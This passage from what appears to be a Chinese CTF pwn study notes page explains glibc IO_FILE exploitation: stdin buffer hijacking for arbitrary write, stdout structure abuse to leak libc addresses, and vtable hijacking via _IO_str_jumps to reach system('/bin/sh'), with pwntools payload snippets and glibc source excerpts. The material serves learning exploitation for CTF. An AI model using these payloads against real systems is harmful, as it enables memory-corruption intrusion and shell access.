<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;c&#39;</span><span class=o>*</span><span class=mh>0x48</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>__free_hook_addr</span><span class=p>)</span></span></span></code></pre></div></div></li></ul><ol><li>free(1)时跳转到 svcudp_reply+offset 地址执行，将__free_hook 内容的值给 rbp</li><li>rax 指向 chunk1，接着 rdi 指向[rbp+0x10]处且值为 0，最后 call leave; ret 使得 rsp 指向 pop;pop;ret 处</li><li>两次 pop 后 rsp 下移，ret 后指向 rop 位置执行 orw 操作</li></ol><h2 id=io_file>IO_FILE</h2><ul><li><code>glibc</code>高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code>等一众<code>hook</code>全局变量，需要利用<code>IO_FILE</code></li><li>防止多次系统调用 io 开销，将内容先放入缓冲区，塞满则一并输出</li></ul><p><strong>利用</strong>：将原本的<code>_flags</code>或上<code>_IO_CURRENTLY_PUTTING</code>和<code>_IO_IS_APPENDING</code>，即<code>0x1800</code></p><h3 id=stdin-任意写>stdin 任意写</h3><p><strong>思路</strong>：劫持缓冲区为目标地址，数据写入到目标地址</p><p><strong>绕过 fread</strong></p><ul><li><p><code>_IO_file_xsgetn</code></p><ul><li><p>使<code>fp->_IO_buf_base</code>不为空绕过初始化缓冲区</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=c1>// 初始化
</span></span></span></code></pre></div></div></li><li><p>令<code>fp->_IO_read_end = fp->_IO_read_ptr</code>绕过【1】【2】</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>have</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span> <span class=o>-</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>want</span> <span class=o>&lt;=</span> <span class=n>have</span><span class=p>){}</span><span class=c1>// 所需数据小于缓冲区大小【1】
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>have</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=c1>// 将缓冲区对应数据复制到目标地址中可能出现不必要问题【2】
</span></span></span></code></pre></div></div></li><li><p>使缓冲区大小大于所需数据进入<code>underflow</code>函数</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span> <span class=o>&amp;&amp;</span> <span class=n>want</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_end</span> <span class=o>-</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>))</span><span class=c1>// 调用__underflow(fp)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>else</span> <span class=c1>// 所需数据长度大于缓冲区大小会使用SYSREAD直接往变量读入数据
</span></span></span></code></pre></div></div></li></ul></li><li><p><code>_IO_new_file_underflow</code></p><ul><li><p>绕过 EOF：<code>_flags</code>中的<code>_IO_NO_READS</code>不能置位</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _IO_NO_READS 4
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_NO_READS</span><span class=p>)</span> <span class=c1>// return EOF
</span></span></span></code></pre></div></div></li><li><p>绕过：<code>_IO_LINE_BUF(0x200)</code>和<code>_IO_UNBUFFERED(2)</code>不能置位</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>_IO_LINE_BUF</span> <span class=o>|</span> <span class=n>_IO_UNBUFFERED</span><span class=p>))</span></span></span></code></pre></div></div></li><li><p>设置 FILE 结构体<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>，同时<code>fp->fileno</code>为 0</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_base</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_ptr</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_end</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>count</span> <span class=o>=</span> <span class=nf>_IO_SYSREAD</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>,</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_end</span> <span class=o>-</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 利用: read(fp-&gt;_fileno, buf, size)
</span></span></span></code></pre></div></div></li></ul></li></ul><p><strong>fread 利用条件</strong></p><ul><li><code>_IO_read_end = _IO_read_ptr</code></li><li><code>_flag & ~_IO_NO_READS</code> 即 <code>_flag & ~0x4</code></li><li><code>_fileno=0</code>，读入数据来源<code>stdin</code></li><li><code>_IO_buf_base=write_start, _IO_buf_end=write_end</code>，且<code>_IO_buf_end - _IO_buf_base</code>大于 fread 读的数据</li></ul><p><strong>scanf 绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#39;, &amp;v&#34;</span><span class=p>);</span> <span class=c1>// 同样会走io file
</span></span></span></code></pre></div></div><p><strong>利用</strong></p><ul><li><code>_IO_2_1_stdin_.file._IO_buf_base</code>覆盖为<code>_IO_write_base</code>地址即<code>offset 0x20</code>，scanf 触发任意地址写</li><li>即修改<code>_IO_buf_base</code>中<code>_IO_write_base</code>指向的值</li><li>包括覆盖三个 write 相关指针值（设 0）以及修改<code>_IO_buf_base</code>和<code>_IO_buf_end</code>覆盖为<code>__free_hook</code>区域</li><li>再次任意地址写向<code>__free_hook</code>写<code>one_gadget</code></li></ul><p><strong>技巧</strong></p><p>① IO_FILE 打坏</p><ul><li>使用 pwndbg 中<code>cyclic 1000</code>产生随机数，输入后调试查看目标地址<code>__free_hook</code>被 xxxx 覆盖，使用<code>cyclic -l xxxx</code>获取偏移</li><li>修改该偏移对应的内容即可正确覆盖<code>__free_hook</code></li><li>若输入为 1 跳出循环则不断输入<code>'1\n'*num</code>尝试跳出，或</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1</span><span class=se>\n</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=stdout-leak>stdout Leak</h3><ul><li>堆无输出功能时，劫持<code>_IO_2_1_stdout_</code>结构体泄露 libc 基址</li><li>bss 段中可能存放 stdout 对应 IO_FILE 的地址，修改<code>stdout</code>的<code>FILE</code>结构体中的缓冲区指针进行信息泄漏</li></ul><img src=/img/pwn_note.zh-cn.assets/1728446804381106.png alt=图片无法加载><ul><li>程序正确执行到<code>_IO_overflow</code>时会将输出缓冲区数据输出，将要泄露地址设置为输出缓冲区即可</li></ul><p><strong>检查绕过</strong></p><ul><li><p><code>_IO_new_file_xsputn</code></p><ul><li><p>使<code>_IO_write_end = _IO_write_ptr</code>绕过<code>count > 0</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_end</span> <span class=o>&gt;</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>count</span> <span class=o>=</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_end</span> <span class=o>-</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>count</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=c1>// 文件流缓冲区还有空闲，数据进入文件流缓冲区
</span></span></span></code></pre></div></div></li></ul></li><li><p><code>_IO_new_file_overflow</code></p><ul><li><p><code>_flags</code>不能包含<code>_IIO_NO_WRITES</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_NO_WRITES</span><span class=p>)</span> <span class=c1>// 操作失败退出 #define _IO_NO_WRITES 0x8
</span></span></span></code></pre></div></div></li><li><p><code>_flags</code>需包含<code>_IO_CURRENTLY_PUTTING</code>来避免进入分支</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// #define _IO_CURRENTLY_PUTTING 0x0800
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>((</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_CURRENTLY_PUTTING</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span></span></span></code></pre></div></div></li><li><p>令<code>_IO_write_base = read_start, _IO_write_ptr = read_end</code>使调用<code>_IO_do_write</code>输出缓冲区内容</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>ch</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nf>_IO_do_write</span><span class=p>(</span><span class=n>f</span><span class=p>,</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>,</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>-</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>);</span></span></span></code></pre></div></div></li></ul></li><li><p><code>new_do_write</code></p><ul><li><p>构造<code>_flags</code>包含<code>_IO_IS_APPENDING</code>或<code>_IO_read_end = _IO_write_base</code>，且构造<code>_fileno=1</code>，最终执行<code>_IO_SYSWRITE</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_IS_APPENDING</span><span class=p>)</span> <span class=p>...</span> <span class=c1>// #define _IO_IS_APPENDING 0x1000
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span> <span class=o>!=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>)</span> <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>count</span> <span class=o>=</span> <span class=nf>_IO_SYSWRITE</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>to_do</span><span class=p>);</span> <span class=c1>// 实际调用write(f-&gt;_fileno, data, to_do)
</span></span></span></code></pre></div></div></li></ul></li></ul><p><strong>利用</strong>：实现任意读，伪造为<code>0xfbad1880</code>基本能过</p><ul><li><code>_flag & ~_IO_NO_WRITES</code>，<code>_flag & _IO_CURRENTLY_PUTTING</code>，<code>_fileno = 1</code></li><li><code>_IO_write_base = leak_start_addr</code>，<code>_IO_write_ptr = leak_end_addr</code></li><li><code>_IO_read_end = _IO_write_base</code> 或 <code>_flag & _IO_IS_APPENDING</code></li><li>设置<code>_IO_write_end = _IO_write_ptr</code>（非必须）</li></ul><blockquote><p>无输出时可以通过 house of roman 申请到目标地址进行劫持</p></blockquote><p><strong>劫持到<code>_IO_2_1_stdout_</code>构造 payload 泄露地址内容</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xfbad1800</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leak_libc_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leak_libc_addr</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span></span></span></code></pre></div></div><p>当有<code>write</code>和<code>puts</code>时将会把该地址内容一并输出</p><p><strong>劫持到<code>_IO_2_1_stdout_ - 0x43</code> chunk 处泄露 libc 地址</strong></p><ul><li>修改 <code>_IO_write_base</code> 指针最低 1 字节为 <code>\x88</code> 使其指向 <code>_chain</code> 变量</li><li><code>_chain</code> 变量存储了 <code>_IO_2_1_stdin_</code> 结构体地址</li><li>下一次输出内容时会从<code>0xxxx88</code>地址处开始将 write buf 中内容输出，可泄露 libc 基址</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 若要在后续利用system, 参数设置为stdout地址来获取 shell, 使用 b&#34;;sh;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x33</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xfbad1800</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;;sh;&#34;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=vtable-劫持>vtable 劫持</h3><h4 id=223>2.23</h4><ul><li>glibc-2.23，该版本无<code>_IO_vtable_check</code>检查<code>vtable</code>虚函数表地址，可修改<code>vtable</code>指针指向<code>fake vtable</code>指向 system 函数</li><li>调用 IO 函数时，<code>_IO_2_1_stdout_</code>结构体指针作为参数传入<code>vtable</code>中的函数，可将 flag 字段 4 字节填充<code>;sh;</code>来获取 shell</li></ul><p><strong>利用</strong></p><p>① 可以使用 fast bin attack 错位在<code>_IO_2_1_stdout_+157</code>处申请出 chunk 来，size 位为<code>0x7f</code>，该大小可覆盖到 vtable</p><p>② 若为 puts 函数泄露，可利用<code>_IO_puts</code>函数中的<code>_IO_sputn(_IO_stdout, str, len)</code>判断时进行劫持</p><p>图中 vtable 直接指向 call 的地址，而调试发现为<code>call [rax+offset]</code>，需要劫持 vtable 指针逆向偏移 offset 大小，调用<code>_IO_sputn(_IO_stdout, str, len)</code></p><img src=/img/pwn_note.zh-cn.assets/image-20250110134140402.png alt=图片无法加载><h4 id=224>2.24</h4><p>① 劫持 vtable 到_IO_str_jumps</p><ul><li>glibc-2.24 中，<code>_IO_sputn</code>的宏增加了<code>IO_validate_vtable</code>函数对<code>stdout</code>结构体的 <code>*vtable</code> 指针进行校验后再调用<code>__xsputs</code></li><li>在代码分析博客查看<code>_IO_sputn</code>宏以及<code>IO_validate_vtable</code>函数</li><li><code>vtable</code> 必须满足在 <code>__stop___IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，伪造 <code>vtable</code> 通常不满足条件</li></ul><p><strong>原理</strong></p><ul><li>利用 <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间</li><li>将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>__IO_wstr_jumps</code> 地址可通过 <code>IO_validate_vtable</code> 检测</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>const</span> <span class=k>struct</span> <span class=n>_IO_jump_t</span> <span class=n>_IO_str_jumps</span> <span class=n>libio_vtable</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>JUMP_INIT_DUMMY</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>finish</span><span class=p>,</span> <span class=n>_IO_str_finish</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>overflow</span><span class=p>,</span> <span class=n>_IO_str_overflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>underflow</span><span class=p>,</span> <span class=n>_IO_str_underflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>uflow</span><span class=p>,</span> <span class=n>_IO_default_uflow</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>pbackfail</span><span class=p>,</span> <span class=n>_IO_str_pbackfail</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>xsputn</span><span class=p>,</span> <span class=n>_IO_default_xsputn</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>xsgetn</span><span class=p>,</span> <span class=n>_IO_default_xsgetn</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>seekoff</span><span class=p>,</span> <span class=n>_IO_str_seekoff</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>seekpos</span><span class=p>,</span> <span class=n>_IO_default_seekpos</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>setbuf</span><span class=p>,</span> <span class=n>_IO_default_setbuf</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>sync</span><span class=p>,</span> <span class=n>_IO_default_sync</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>doallocate</span><span class=p>,</span> <span class=n>_IO_default_doallocate</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>read</span><span class=p>,</span> <span class=n>_IO_default_read</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>write</span><span class=p>,</span> <span class=n>_IO_default_write</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>seek</span><span class=p>,</span> <span class=n>_IO_default_seek</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>close</span><span class=p>,</span> <span class=n>_IO_default_close</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>stat</span><span class=p>,</span> <span class=n>_IO_default_stat</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>showmanyc</span><span class=p>,</span> <span class=n>_IO_default_showmanyc</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>JUMP_INIT</span><span class=p>(</span><span class=n>imbue</span><span class=p>,</span> <span class=n>_IO_default_imbue</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><ul><li>&lt; glibc-2.27，利用<code>_IO_str_finish</code></li><li>修改<code>_free_buffer</code>为<code>&amp;system</code>，<code>_IO_buf_base</code>修改为<code>&"/bin/sh"</code>，触发执行<code>_IO_str_finish</code>可获得 shell</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>_IO_str_finish</span> <span class=p>(</span><span class=n>_IO_FILE</span> <span class=o>*</span><span class=n>fp</span><span class=p>,</span> <span class=kt>int</span> <span class=n>dummy</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_USER_BUF</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>(((</span><span class=n>_IO_strfile</span> <span class=o>*</span><span class=p>)</span> <span class=n>fp</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>_s</span><span class=p>.</span><span class=n>_free_buffer</span><span class=p>)</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>);</span>
